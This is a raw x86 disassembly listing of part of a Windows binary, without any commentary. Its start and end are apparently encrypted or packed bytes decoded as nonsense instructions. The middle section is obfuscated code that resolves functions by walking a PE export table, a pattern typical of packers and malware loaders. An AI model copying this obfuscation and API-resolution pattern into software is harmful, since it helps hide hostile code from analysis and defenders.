  40632a:	out    dx,al
  40632b:	mov    dl,0xa7
  40632d:	js     0x4062ba
  40632f:	mov    edi,esi
  406331:	sahf   
  406332:	lods   al,BYTE PTR ds:[esi]
  406333:	adc    edi,DWORD PTR [ecx]
  406335:	rol    BYTE PTR [ecx],cl
  406337:	xor    DWORD PTR [ecx],0xffffff98
  40633a:	xchg   ecx,eax
  40633b:	rol    BYTE PTR [ecx],1
  40633d:	inc    esi
  40633e:	pushf  
  40633f:	adc    eax,0x34d2ccf1
  406344:	dec    ecx
  406345:	push   ebp
  406346:	inc    edx
  406347:	push   ebp
  406348:	mov    ds:0x6d9ca2f5,al
  40634d:	jg     0x406324
  40634f:	pop    edx
  406350:	leave  
  406351:	bound  edx,QWORD PTR [ecx+edi*4-0x745f523f]
  406358:	icebp  
  406359:	into   
  40635a:	outs   dx,DWORD PTR ds:[esi]
  40635b:	push   ds
  40635c:	(bad)  
  40635d:	imul   eax,DWORD PTR [esi],0xffffffd3
  406360:	sub    ah,BYTE PTR [eax-0x7939d321]
  406366:	dec    ebp
  406367:	adc    BYTE PTR [edi-0x1e59a3db],ah
  40636d:	pop    es
  40636e:	adc    DWORD PTR [esi+0x45d515a6],0x3c2b5dd0
  406378:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637a:	mov    ah,0x87
  40637c:	xchg   esp,eax
  40637d:	jne    0x4063de
  40637f:	jmp    0x2159:0x7206435b
  406386:	and    al,0x1b
  406388:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40638a:	loope  0x406312
  40638c:	jg     0x406371
  40638e:	add    ch,al
  406390:	fisub  WORD PTR ds:0xaf1f5c98
  406396:	retf   0x73e
  406399:	cmc    
  40639a:	xchg   ecx,eax
  40639b:	and    ebx,DWORD PTR [eax]
  40639d:	repz (bad) 
  40639f:	jmp    0x40640d
  4063a1:	dec    eax
  4063a2:	jnp    0x406417
  4063a4:	push   ebx
  4063a5:	ins    DWORD PTR es:[edi],dx
  4063a6:	add    bl,BYTE PTR [esi+0x772bba54]
  4063ac:	leave  
  4063ad:	(bad)  
  4063ae:	mov    dl,BYTE PTR [ecx+0x6422e247]
  4063b4:	mov    ah,0xe
  4063b6:	cmp    eax,0x23bb5c9b
  4063bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063bc:	dec    esp
  4063bd:	adc    eax,0x4b87b52f
  4063c2:	addr16 daa 
  4063c4:	or     dl,ah
  4063c6:	call   0x6952:0xa6b50f69
  4063cd:	dec    esp
  4063ce:	stos   DWORD PTR es:[edi],eax
  4063cf:	dec    esp
  4063d0:	push   ebx
  4063d1:	xchg   edi,eax
  4063d2:	(bad)  
  4063d3:	mov    dh,0xc2
  4063d5:	cmc    
  4063d6:	das    
  4063d7:	mov    ecx,0x421a28e0
  4063dc:	and    ah,dl
  4063de:	jge    0x406416
  4063e0:	inc    esi
  4063e1:	mov    esi,0x348d8f4a
  4063e6:	es sti 
  4063e8:	hlt    
  4063e9:	mov    ds:0x4d04c3ef,eax
  4063ee:	je     0x40643d
  4063f0:	inc    eax
  4063f1:	jp     0x4063ac
  4063f3:	std    
  4063f4:	ret    0xa647
  4063f7:	push   0x11d8ee41
  4063fc:	dec    edx
  4063fd:	in     al,dx
  4063fe:	in     eax,0x18
  406400:	cwde   
  406401:	and    BYTE PTR [edx],al
  406403:	out    dx,al
  406404:	(bad)  
  406405:	pop    ecx
  406406:	das    
  406407:	mov    al,ds:0x7a4ef204
  40640c:	mov    dh,bh
  40640e:	adc    ebx,DWORD PTR [ecx]
  406410:	(bad)  
  406411:	retf   
  406412:	inc    ebp
  406413:	dec    edi
  406414:	cmp    BYTE PTR [eax+0x1c],ch
  406417:	jb     0x40639b
  406419:	sahf   
  40641a:	sub    ecx,DWORD PTR [eax]
  40641c:	sub    DWORD PTR [ecx],esi
  40641e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40641f:	ins    DWORD PTR es:[edi],dx
  406420:	repnz push cs
  406422:	xchg   ecx,eax
  406423:	lfs    edi,FWORD PTR [edi]
  406426:	sbb    BYTE PTR [edi+eiz*8],al
  406429:	in     al,0xe7
  40642b:	fs inc edi
  40642d:	dec    edi
  40642e:	test   BYTE PTR [ecx],0x48
  406431:	push   esp
  406432:	add    al,bh
  406434:	scas   al,BYTE PTR es:[edi]
  406435:	mov    dl,0x5
  406437:	or     eax,0x52a4f7cc
  40643c:	(bad)  
  40643d:	sub    al,0x97
  40643f:	cmp    ebp,esi
  406441:	inc    esi
  406442:	add    eax,0x95d5b570
  406447:	mov    ebx,0x2372f0c2
  40644c:	mov    WORD PTR [eax+0x5999b5f4],cs
  406452:	cs mov ebx,0x2da4474f
  406458:	xor    DWORD PTR [ecx-0x69e9d022],edx
  40645e:	out    0x15,eax
  406460:	sar    DWORD PTR [edx-0x351dbe1c],1
  406466:	cmp    DWORD PTR [ecx],esi
  406468:	outs   dx,DWORD PTR ds:[esi]
  406469:	and    dh,bh
  40646b:	mov    edx,0x81bd12e0
  406470:	mov    ds:0xdbc41535,eax
  406475:	(bad)  
  406476:	out    0x41,eax
  406478:	xor    DWORD PTR [ecx+0x4c],edi
  40647b:	mov    ds:0x71522c00,al
  406480:	mov    bl,ch
  406482:	imul   esp,DWORD PTR ds:0xaebc8f19,0x33
  406489:	and    BYTE PTR [edx-0x3d60be05],ch
  40648f:	hlt    
  406490:	arpl   ax,bx
  406492:	repnz inc edx
  406494:	mov    eax,DWORD PTR [ebx+esi*1]
  406497:	enter  0xabff,0x9a
  40649b:	sub    al,0xe3
  40649d:	lods   eax,DWORD PTR ds:[esi]
  40649e:	adc    al,0xdd
  4064a0:	cli    
  4064a1:	fadd   QWORD PTR [edi+0x79]
  4064a4:	fs push edx
  4064a6:	dec    ecx
  4064a7:	push   0x3e24f2a9
  4064ac:	std    
  4064ad:	fldz   
  4064af:	adc    eax,esp
  4064b1:	sbb    ebp,esp
  4064b3:	xchg   edi,eax
  4064b4:	add    BYTE PTR [ecx-0x51b147fa],dh
  4064ba:	stos   DWORD PTR es:[edi],eax
  4064bb:	cmp    BYTE PTR [ecx],0x24
  4064be:	pop    ecx
  4064bf:	imul   DWORD PTR [edi]
  4064c1:	int    0xb8
  4064c3:	test   al,0x49
  4064c5:	test   BYTE PTR [eax],cl
  4064c7:	or     dl,BYTE PTR [ebx-0x758f9bbb]
  4064cd:	in     al,0x19
  4064cf:	leave  
  4064d0:	mov    WORD PTR [ebp-0x41d296fe],?
  4064d6:	mov    ebx,0xd587e62d
  4064db:	dec    edi
  4064dc:	cmp    ebx,ebp
  4064de:	push   0xffffffbf
  4064e0:	in     eax,0x55
  4064e2:	adc    al,0x94
  4064e4:	pop    es
  4064e5:	dec    edx
  4064e6:	pop    esp
  4064e7:	and    ah,bh
  4064e9:	jecxz  0x40650b
  4064eb:	nop
  4064ec:	rcl    DWORD PTR [edx+0x5594dec3],1
  4064f2:	inc    edx
  4064f3:	xor    DWORD PTR [edx],esp
  4064f5:	(bad)  
  4064f6:	daa    
  4064f7:	pop    edi
  4064f8:	mov    ebx,0x483b7af2
  4064fd:	aaa    
  4064fe:	ret    
  4064ff:	jecxz  0x406561
  406501:	xchg   BYTE PTR [ebp+0x884dbbe],bl
  406507:	cmp    DWORD PTR [edi+0x1ea4de4b],eax
  40650d:	outs   dx,BYTE PTR ds:[esi]
  40650e:	inc    edx
  40650f:	pop    ebp
  406510:	loope  0x406581
  406512:	out    dx,eax
  406513:	ret    
  406514:	sahf   
  406515:	jp     0x406585
  406517:	dec    edx
  406518:	or     BYTE PTR [ecx-0x43],bl
  40651b:	mov    ah,0x8b
  40651d:	mov    eax,ds:0xe08bb7ba
  406522:	pop    esp
  406523:	dec    ebx
  406524:	mov    ebx,ebp
  406526:	push   edi
  406527:	retf   0x22fd
  40652a:	cmc    
  40652b:	pop    esp
  40652c:	jo     0x4064b1
  40652e:	out    0xc1,eax
  406530:	fsubr  DWORD PTR [esi+0x17]
  406533:	mov    bl,0x2e
  406535:	jp     0x406534
  406537:	out    dx,al
  406538:	push   esp
  406539:	xchg   esi,eax
  40653a:	out    dx,al
  40653b:	sbb    DWORD PTR [ecx-0x749a2a82],ebp
  406541:	inc    edx
  406542:	or     al,0xa8
  406544:	shl    BYTE PTR [ecx-0x11bfa103],0x4e
  40654b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40654c:	jge    0x4064e8
  40654e:	xor    al,0xb1
  406550:	into   
  406551:	inc    eax
  406552:	lds    ecx,FWORD PTR [ebp-0x3e85582b]
  406558:	mov    edx,0x616b4385
  40655d:	(bad)  
  40655e:	jo     0x4064e7
  406560:	or     DWORD PTR [ecx+0x62],edi
  406563:	push   es
  406564:	mov    ebx,0x92b0ba67
  406569:	sbb    DWORD PTR [edx+0x7b0b4c93],0xffffffbf
  406570:	out    dx,al
  406571:	or     BYTE PTR [edi+eax*8],dl
  406574:	and    DWORD PTR [esi],edx
  406576:	clc    
  406577:	inc    esi
  406578:	jo     0x40651b
  40657a:	(bad)  
  40657b:	sub    DWORD PTR [edi],edi
  40657d:	xchg   esp,eax
  40657e:	ja     0x406506
  406580:	pop    edx
  406581:	cmp    eax,0x7a485543
  406586:	cmp    al,BYTE PTR [edx-0x7504a017]
  40658c:	stc    
  40658d:	inc    ebp
  40658e:	in     al,dx
  40658f:	jae    0x406539
  406591:	inc    edi
  406592:	sub    BYTE PTR [ebx-0x29],cl
  406595:	or     cl,BYTE PTR [esi-0x5a]
  406598:	add    BYTE PTR [edi+edx*4],al
  40659b:	test   al,0xc
  40659d:	inc    ebx
  40659e:	or     ebx,DWORD PTR [edx-0x7f]
  4065a1:	push   eax
  4065a2:	jp     0x4065ab
  4065a4:	mov    esi,0x8fb34248
  4065a9:	inc    BYTE PTR [ebx-0x3f]
  4065ac:	cmc    
  4065ad:	rol    esp,0xcd
  4065b0:	int    0x1d
  4065b2:	dec    esp
  4065b3:	ins    DWORD PTR es:[edi],dx
  4065b4:	das    
  4065b5:	aad    0x7b
  4065b7:	popf   
  4065b8:	jl     0x406586
  4065ba:	in     eax,0x52
  4065bc:	sar    DWORD PTR [eax+0x39fdaec6],0xcb
  4065c3:	and    eax,DWORD PTR ds:0x3c7556c0
  4065c9:	jno    0x4065d9
  4065cb:	sbb    ecx,DWORD PTR [edx+ebx*4-0x6b]
  4065cf:	imul   esi,DWORD PTR [eax],0x44c9e394
  4065d5:	jg     0x406603
  4065d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065d8:	call   0x3658e9c9
  4065dd:	inc    ecx
  4065de:	jmp    0x40660c
  4065e0:	push   ebp
  4065e1:	loopne 0x40663d
  4065e3:	jne    0x4065e1
  4065e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065e6:	fisub  DWORD PTR [ecx]
  4065e8:	fmul   QWORD PTR [ebp-0x3272da6a]
  4065ee:	inc    DWORD PTR [ecx+0x4260001d]
  4065f4:	add    BYTE PTR [eax+edx*4],cl
  4065f7:	inc    edx
  4065f8:	add    BYTE PTR [ebx],dh
  4065fa:	retf   
  4065fb:	xor    DWORD PTR ds:0x425008,0xe68
  406605:	xor    edx,ebx
  406607:	mov    DWORD PTR ds:0x427008,0xa36
  406611:	cmp    edx,ecx
  406613:	mov    DWORD PTR ds:0x425000,0x1171
  40661d:	je     0x40684c
  406623:	mov    ecx,DWORD PTR [ebp-0x4]
  406626:	xor    ecx,ebx
  406628:	adc    DWORD PTR ds:0x427000,0x2a26
  406632:	add    ecx,eax
  406634:	cmp    esi,ecx
  406636:	jne    0x4067ef
  40663c:	push   DWORD PTR [ebp+0x8]
  40663f:	call   0x415b52
  406644:	mov    ecx,DWORD PTR ds:0x41d20c
  40664a:	mov    ecx,DWORD PTR [ecx]
  40664c:	and    DWORD PTR ds:0x42900c,ecx
  406652:	mov    DWORD PTR [ebp-0x18],eax
  406655:	mov    eax,DWORD PTR [ebp-0x4]
  406658:	mov    DWORD PTR ds:0x428018,0x10
  406662:	cmp    DWORD PTR ds:0x428018,0x0
  406669:	je     0x4066c2
  40666f:	cmp    DWORD PTR ds:0x428018,0x7
  406676:	jne    0x406685
  40667c:	push   DWORD PTR [ebp-0x28]
  40667f:	call   DWORD PTR ds:0x421004
  406685:	cmp    DWORD PTR ds:0x428018,0x8
  40668c:	jne    0x40669f
  406692:	mov    edi,DWORD PTR ds:0x428018
  406698:	dec    edi
  406699:	mov    DWORD PTR ds:0x428018,edi
  40669f:	mov    edi,DWORD PTR ds:0x428018
  4066a5:	dec    edi
  4066a6:	mov    DWORD PTR ds:0x428018,edi
  4066ac:	jmp    0x406662
  4066b1:	mov    ecx,DWORD PTR ds:0x42003f
  4066b7:	mov    edi,DWORD PTR ds:0x41d1d4
  4066bd:	sub    edi,ecx
  4066bf:	add    ecx,DWORD PTR [ecx+edi*1]
  4066c2:	mov    ecx,DWORD PTR [ebp-0x18]
  4066c5:	xor    eax,ebx
  4066c7:	mov    edi,0x3272db
  4066cc:	add    eax,edi
  4066ce:	mov    DWORD PTR ds:0x425008,0x2bfa
  4066d8:	cmp    ecx,eax
  4066da:	je     0x4068bc
  4066e0:	sbb    DWORD PTR ds:0x426000,0x426010
  4066ea:	push   DWORD PTR [ebp-0x18]
  4066ed:	push   DWORD PTR [ebp+0x8]
  4066f0:	call   0x417fa0
  4066f5:	sbb    DWORD PTR ds:0x42601c,ecx
  4066fb:	mov    DWORD PTR [ebp-0x18],eax
  4066fe:	dec    eax
  4066ff:	mov    eax,DWORD PTR [ebp-0x4]
  406702:	and    DWORD PTR ds:0x425018,0x0
  40670c:	jmp    0x40671e
  406711:	mov    ecx,DWORD PTR ds:0x425018
  406717:	inc    ecx
  406718:	mov    DWORD PTR ds:0x425018,ecx
  40671e:	cmp    DWORD PTR ds:0x425018,0x1e
  406725:	jae    0x40674c
  40672b:	cmp    DWORD PTR ds:0x425018,0x2e
  406732:	jne    0x406741
  406738:	push   DWORD PTR [ebp-0x20]
  40673b:	call   DWORD PTR ds:0x421048
  406741:	jmp    0x406711
  406746:	sbb    ecx,DWORD PTR ds:0x42900c
  40674c:	mov    ecx,DWORD PTR [ebp-0x18]
  40674f:	xor    DWORD PTR ds:0x425000,0x426004
  406759:	xor    eax,ebx
  40675b:	sub    DWORD PTR ds:0x42900c,0x26ad
  406765:	add    eax,edi
  406767:	cmp    ecx,eax
  406769:	mov    DWORD PTR ds:0x42501c,0x148e
  406773:	je     0x4068bc
  406779:	mov    eax,DWORD PTR [ebp-0x18]
  40677c:	mov    eax,DWORD PTR [eax+0x18]
  40677f:	mov    ecx,DWORD PTR ds:0x42500c
  406785:	or     DWORD PTR ds:0x428014,ecx
  40678b:	mov    DWORD PTR [ebp-0x24],eax
  40678e:	mov    eax,DWORD PTR [ebp-0x18]
  406791:	mov    ecx,DWORD PTR [ebp+0x8]
  406794:	add    ecx,DWORD PTR [eax+0x20]
  406797:	mov    DWORD PTR [ebp-0x2c],ecx
  40679a:	and    eax,eax
  40679c:	mov    eax,DWORD PTR [ebp-0x18]
  40679f:	and    ecx,DWORD PTR ds:0x427000
  4067a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4067a8:	adc    DWORD PTR ds:0x425004,0x721
  4067b2:	add    ecx,DWORD PTR [eax+0x24]
  4067b5:	movzx  eax,WORD PTR ds:0x428004
  4067bc:	sbb    eax,DWORD PTR ds:0x42801c
  4067c2:	mov    ds:0x428004,eax
  4067c7:	mov    DWORD PTR [ebp-0x34],ecx
  4067ca:	or     DWORD PTR ds:0x429008,edx
  4067d0:	mov    eax,DWORD PTR [ebp-0x18]
  4067d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4067d6:	sbb    DWORD PTR ds:0x427018,0x427008
  4067e0:	add    ecx,DWORD PTR [eax+0x1c]
  4067e3:	not    eax
  4067e5:	mov    eax,edi
  4067e7:	mov    DWORD PTR [ebp-0x18],ecx
  4067ea:	jmp    0x406884
  4067ef:	movzx  ecx,BYTE PTR ds:0x428010
  4067f6:	add    ecx,DWORD PTR ds:0x42700c
  4067fc:	mov    DWORD PTR ds:0x428010,ecx
  406802:	mov    ecx,DWORD PTR [ebp-0x2c]
  406805:	xor    DWORD PTR ds:0x425004,edi
  40680b:	mov    edx,DWORD PTR [ebp+0x8]
  40680e:	and    DWORD PTR ds:0x425020,0x42901c
  406818:	add    edx,DWORD PTR [ecx+esi*4]
  40681b:	inc    ecx
  40681c:	mov    DWORD PTR [ebp-0x28],edx
  40681f:	sub    DWORD PTR ds:0x425000,ecx
  406825:	mov    ecx,DWORD PTR [ebp-0x4]
  406828:	sbb    DWORD PTR ds:0x42500c,0xc10
  406832:	mov    edx,DWORD PTR [ebp-0x28]
  406835:	xor    ecx,ebx
  406837:	dec    DWORD PTR ds:0x42600c
  40683d:	add    ecx,eax
  40683f:	cmp    edx,ecx
  406841:	je     0x406884
  406847:	jmp    0x406870
  40684c:	mov    ecx,DWORD PTR [ebp-0x4]
  40684f:	mov    edx,DWORD PTR [ebp-0x8]
  406852:	xor    ecx,ebx
  406854:	add    ecx,eax
  406856:	cmp    edx,ecx
  406858:	je     0x4068c8
  40685e:	mov    ecx,DWORD PTR [ebp-0x4]
  406861:	mov    edx,DWORD PTR [ebp-0x30]
  406864:	xor    ecx,ebx
  406866:	add    ecx,eax
  406868:	cmp    edx,ecx
  40686a:	je     0x4068d7
  406870:	lea    eax,[ebp-0x8]
  406873:	push   eax
  406874:	push   DWORD PTR [ebp-0x28]
  406877:	push   DWORD PTR [ebp+0xc]
  40687a:	call   0x401000
  40687f:	mov    eax,0x3272db
  406884:	mov    ecx,DWORD PTR [ebp-0x4]
  406887:	mov    edx,DWORD PTR [ebp-0x8]
  40688a:	xor    ecx,ebx
  40688c:	add    ecx,eax
  40688e:	cmp    edx,ecx
  406890:	je     0x4068ab
  406896:	mov    ecx,DWORD PTR [ebp-0x34]
  406899:	movzx  ecx,WORD PTR [ecx+esi*2]
  40689d:	mov    edx,DWORD PTR [ebp-0x18]
  4068a0:	mov    ecx,DWORD PTR [edx+ecx*4]
  4068a3:	mov    DWORD PTR [ebp-0x38],ecx
  4068a6:	jmp    0x40684c
  4068ab:	mov    ecx,DWORD PTR [ebp-0x14]
  4068ae:	xor    ecx,ebx
  4068b0:	lea    esi,[esi+ecx*1+0x3272db]
  4068b7:	jmp    0x40427f
  4068bc:	mov    eax,DWORD PTR [ebp-0x4]
  4068bf:	xor    eax,ebx
  4068c1:	add    eax,edi
  4068c3:	jmp    0x408d90
  4068c8:	mov    eax,DWORD PTR [ebp-0x4]
  4068cb:	xor    eax,ebx
  4068cd:	add    eax,0x3272db
  4068d2:	jmp    0x408d90
  4068d7:	mov    ecx,DWORD PTR [ebp-0x38]
  4068da:	add    ecx,DWORD PTR [ebp+0x8]
  4068dd:	mov    DWORD PTR [ebp-0x10],ecx
  4068e0:	mov    ecx,DWORD PTR [ebp-0x1c]
  4068e3:	test   ecx,ecx
  4068e5:	je     0x408d1b
  4068eb:	mov    DWORD PTR [ebp-0x20],0x0
  4068f2:	push   0x3
  4068f4:	xor    edx,edx
  4068f6:	pop    edx
  4068f7:	add    edx,0x8
  4068fa:	push   edx
  4068fb:	pop    ecx
  4068fc:	push   0x6
  4068fe:	dec    ecx
  4068ff:	pop    ebx
  406900:	dec    ebx
  406901:	xchg   ebx,ecx
  406903:	sub    ebx,ecx
  406905:	xchg   ebx,ecx
  406907:	dec    ecx
  406908:	mov    eax,DWORD PTR [ebp-0x1c]
  40690b:	imul   eax,ecx
  40690e:	sub    esp,eax
  406910:	mov    DWORD PTR [ebp-0x20],esp
  406913:	mov    eax,DWORD PTR [ebp-0x4]
  406916:	mov    ecx,0x7510893
  40691b:	xor    eax,ecx
  40691d:	mov    edx,0x3272db
  406922:	add    eax,edx
  406924:	mov    DWORD PTR [ebp+0x8],eax
  406927:	mov    eax,DWORD PTR [ebp-0x14]
  40692a:	xor    eax,ecx
  40692c:	add    eax,edx
  40692e:	mov    edx,DWORD PTR [ebp+0x14]
  406931:	imul   eax,DWORD PTR [edx]
  406934:	mov    edx,DWORD PTR [ebp-0x4]
  406937:	xor    edx,ecx
  406939:	mov    ecx,DWORD PTR [ebp+0x8]
  40693c:	lea    ecx,[edx+ecx*1+0x3272db]
  406943:	cmp    ecx,eax
  406945:	je     0x408d11
  40694b:	mov    edi,DWORD PTR [ebp-0x14]
  40694e:	mov    eax,DWORD PTR [ebp+0x8]
  406951:	mov    edx,DWORD PTR [ebp+0x14]
  406954:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  406958:	mov    ecx,0x7510893
  40695d:	xor    edx,edx
  40695f:	xor    edi,ecx
  406961:	mov    esi,0x3272db
  406966:	add    edi,esi
  406968:	div    edi
  40696a:	mov    edx,DWORD PTR [ebp-0x4]
  40696d:	xor    edx,ecx
  40696f:	lea    eax,[edx+eax*1+0x3272db]
  406976:	mov    edx,DWORD PTR [ebp+0x8]
  406979:	mov    edi,DWORD PTR [ebp-0x20]
  40697c:	mov    DWORD PTR [edi+edx*4],eax
  40697f:	mov    eax,DWORD PTR [ebp-0x14]
  406982:	mov    edx,DWORD PTR [ebp+0x8]
  406985:	xor    eax,ecx
  406987:	lea    eax,[eax+edx*1+0x3272db]
  40698e:	mov    DWORD PTR [ebp+0x8],eax
  406991:	mov    eax,DWORD PTR [ebp-0x14]
  406994:	mov    edx,DWORD PTR [ebp+0x14]
  406997:	xor    eax,ecx
  406999:	add    eax,esi
  40699b:	imul   eax,DWORD PTR [edx]
  40699e:	mov    edx,DWORD PTR [ebp-0x4]
  4069a1:	xor    edx,ecx
  4069a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4069a6:	lea    ecx,[edx+ecx*1+0x3272db]
  4069ad:	cmp    ecx,eax
  4069af:	jmp    0x408d04
  4069b4:	into   
  4069b5:	mov    BYTE PTR [ecx],bl
  4069b7:	(bad)  
  4069b8:	adc    esp,DWORD PTR [ebx+0x10b2688d]
  4069be:	shl    DWORD PTR [ebx-0x42],0xe6
  4069c2:	cdq    
  4069c3:	mov    dl,al
  4069c5:	cmp    al,0x62
  4069c7:	bound  ebp,QWORD PTR [edx]
  4069c9:	pop    edi
  4069ca:	bound  esp,QWORD PTR [edx-0x7f]
  4069cd:	int3   
  4069ce:	xchg   edx,esi
  4069d0:	stos   DWORD PTR es:[edi],eax
  4069d1:	dec    ecx
  4069d2:	in     al,dx
  4069d3:	je     0x4069e0
  4069d5:	pop    ss
  4069d6:	add    ch,BYTE PTR [edx]
  4069d8:	mov    al,0x98
  4069da:	ror    esp,1
  4069dc:	xchg   esi,eax
  4069dd:	inc    eax
  4069de:	clc    
  4069df:	(bad)  
  4069e0:	ret    0x8e68
  4069e3:	mov    ebp,0x2c69fc72
  4069e8:	jecxz  0x4069c6
  4069ea:	shl    DWORD PTR [eax+0x60],cl
  4069ed:	ins    BYTE PTR es:[edi],dx
  4069ee:	(bad)
  4069f1:	(bad)  
  4069f2:	ss jmp 0xe6fa:0x6370017a
  4069fa:	scas   al,BYTE PTR es:[edi]
  4069fb:	mov    WORD PTR [esp+ebx*1-0x2067e4f9],ds
  406a02:	jp     0x406a81
  406a04:	and    eax,0xc1f967ac
  406a09:	cs mov ds:0x7b9d42f7,al
  406a10:	shl    ebp,1
  406a12:	(bad)  
  406a13:	(bad)  
  406a15:	or     ah,ah
  406a17:	sti    
  406a18:	scas   al,BYTE PTR es:[edi]
  406a19:	mov    edx,0x5c84b759
  406a1e:	test   eax,0xde20a05a
  406a23:	or     edx,DWORD PTR [esi]
  406a25:	or     BYTE PTR [edx],dl
  406a27:	sbb    al,BYTE PTR [edi]
  406a29:	les    ecx,FWORD PTR [eax-0x1f]
  406a2c:	into   
  406a2d:	xor    ebx,DWORD PTR [ebp+0x6a098468]
  406a33:	pusha  
  406a34:	and    BYTE PTR [ecx+0x7e],0xcc
  406a38:	pop    edi
  406a39:	and    ch,BYTE PTR [ebp+0x26]
  406a3c:	add    edi,DWORD PTR [eax-0x35f5d791]
  406a42:	mov    eax,0x8649be57
  406a47:	retf   
  406a48:	std    
  406a49:	dec    ebp
  406a4a:	gs std 
  406a4c:	dec    esi
  406a4d:	mov    bl,BYTE PTR [esp]
  406a50:	fdiv   QWORD PTR [edx-0x600fc73a]
  406a56:	ins    BYTE PTR es:[edi],dx
  406a57:	mov    edi,0x8af810a8
  406a5c:	sbb    DWORD PTR [eax+0x48],ebp
  406a5f:	rcl    DWORD PTR [esi-0x22bfc6bd],1
  406a65:	pop    DWORD PTR [esi]
  406a67:	arpl   WORD PTR [eax],sp
  406a69:	sbb    eax,DWORD PTR [edi-0x70a79106]
  406a6f:	mov    ebp,0x4d5d9ebb
  406a74:	pop    ebp
  406a75:	xchg   edx,eax
  406a76:	add    DWORD PTR [ebx],0xa08a18eb
  406a7c:	pop    ecx
  406a7d:	ins    DWORD PTR es:[edi],dx
  406a7e:	arpl   WORD PTR ds:0x7aad777c,di
  406a84:	mov    bl,0x49
  406a86:	fdivr  DWORD PTR [esi+0x32]
  406a89:	outs   dx,DWORD PTR ds:[esi]
  406a8a:	push   cs
  406a8b:	scas   al,BYTE PTR es:[edi]
  406a8c:	dec    ebx
  406a8d:	mul    DWORD PTR [edi]
  406a8f:	fistp  WORD PTR [edx-0x6d]
  406a92:	sbb    DWORD PTR [ecx],edi
  406a94:	outs   dx,DWORD PTR ds:[esi]
  406a95:	lods   eax,DWORD PTR ds:[esi]
  406a96:	cmp    dh,BYTE PTR [edi+ebp*8]
  406a99:	jo     0x406ac2
  406a9b:	xor    BYTE PTR [eax+edx*1+0x4c],bl
  406a9f:	addr16 mov al,0x29
  406aa2:	xchg   edx,edx
  406aa4:	sub    al,0x54
  406aa6:	mov    ecx,0xe0a9d1b3
  406aab:	hlt    
  406aac:	pusha  
  406aad:	push   esp
  406aae:	and    BYTE PTR [esi],0xdb
  406ab1:	mov    al,ds:0x5e897a0e
  406ab6:	xor    eax,0x9d9104e6
  406abb:	pop    edi
  406abc:	retf   
  406abd:	lds    ebp,FWORD PTR [eax]
  406abf:	icebp  
  406ac0:	adc    DWORD PTR [ebx+ebx*4],0xffffffa2
  406ac4:	cmp    DWORD PTR [edi],0x7c
  406ac7:	stc    
  406ac8:	aam    0xf
  406aca:	cmp    BYTE PTR [ecx+0x27fd8a39],dl
  406ad0:	jle    0x406af5
  406ad2:	inc    esp
  406ad3:	cmp    DWORD PTR [edi],ebx
  406ad5:	inc    esp
  406ad6:	sub    al,0x25
  406ad8:	jnp    0x406a60
  406ada:	inc    ecx
  406adb:	mov    cl,0x36
  406add:	shr    DWORD PTR [eax+0x7f864d1b],1
  406ae3:	fwait
  406ae4:	call   0x36a7b272
  406ae9:	outs   dx,DWORD PTR ds:[esi]
  406aea:	mov    DWORD PTR [eax+0x16f7ed1a],esi
  406af0:	aas    
  406af1:	scas   eax,DWORD PTR es:[edi]
  406af2:	pop    esi
  406af3:	mov    ebp,0x2ee0fee7
  406af8:	push   cs
  406af9:	fisubr WORD PTR [ecx-0x1aa52867]
  406aff:	leave  
  406b00:	mov    dh,bh
  406b02:	pushf  
  406b03:	rcr    BYTE PTR [esi],0x75
  406b06:	sub    ebp,DWORD PTR [esi]
  406b08:	(bad)  
  406b09:	cmc    
  406b0a:	lods   al,BYTE PTR ds:[esi]
  406b0b:	aam    0xd1
  406b0d:	pushf  
  406b0e:	pop    eax
  406b0f:	mov    eax,ds:0xc0f823bc
  406b14:	dec    ebx
  406b15:	push   es
  406b16:	stos   DWORD PTR es:[di],eax
  406b18:	push   ebx
  406b19:	or     eax,0xf49b1a4c
  406b1e:	loope  0x406b84
  406b20:	add    DWORD PTR [ebx-0x62c7cbd9],esi
  406b26:	mov    eax,ds:0x582ee557
  406b2b:	retf   0x2875
  406b2e:	xor    al,0xc5
  406b30:	add    DWORD PTR [esi],0x67
  406b33:	aas    
  406b34:	mov    bh,BYTE PTR [edi]
  406b36:	mov    bl,0x80
  406b38:	shr    BYTE PTR [esi-0xa],0x5b
  406b3c:	sub    ecx,0x6c77fe9e
  406b42:	jmp    0x56f8256d
  406b47:	mov    ds:0x2fd48ddd,eax
  406b4c:	dec    edx
  406b4d:	adc    ch,BYTE PTR [eax]
  406b4f:	xchg   edi,eax
  406b50:	clc    
  406b51:	fdivr  st(0),st
  406b53:	ins    BYTE PTR es:[edi],dx
  406b54:	ss xchg edx,eax
  406b56:	or     eax,0xabb07e34
  406b5b:	in     al,dx
  406b5c:	pop    ds
  406b5d:	cdq    
  406b5e:	icebp  
  406b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b60:	out    0x74,eax
  406b62:	pop    ebx
  406b63:	fild   DWORD PTR [ebp-0x71e2e6d5]
  406b69:	mov    eax,0x48f3f7cd
  406b6e:	and    BYTE PTR [edx],dh
  406b70:	inc    edx
  406b71:	push   es
  406b72:	mov    ds:0x68560aac,eax
  406b77:	mov    ebp,0x83c3251b
  406b7c:	scas   eax,DWORD PTR es:[edi]
  406b7d:	mov    al,0xac
  406b7f:	ficom  WORD PTR [esi+ebx*4]
  406b82:	ror    BYTE PTR [ebx+ebx*1-0x6],cl
  406b86:	sbb    DWORD PTR [ecx+0x51110b96],eax
  406b8c:	mov    bl,0x8d
  406b8e:	mov    BYTE PTR [esi+0x79],cl
  406b91:	mov    cl,BYTE PTR [eax-0x20574873]
  406b97:	inc    esi
  406b98:	and    DWORD PTR [ebx-0x19c5b16d],ebp
  406b9e:	sub    eax,0x599fd11c
  406ba3:	fcom   DWORD PTR [eax-0x80]
  406ba6:	jmp    DWORD PTR ds:0xdd90ee8c
  406bac:	js     0x406bb2
  406bae:	dec    eax
  406baf:	push   0x4f
  406bb1:	repnz push 0x7e
  406bb4:	js     0x406c22
  406bb6:	push   ecx
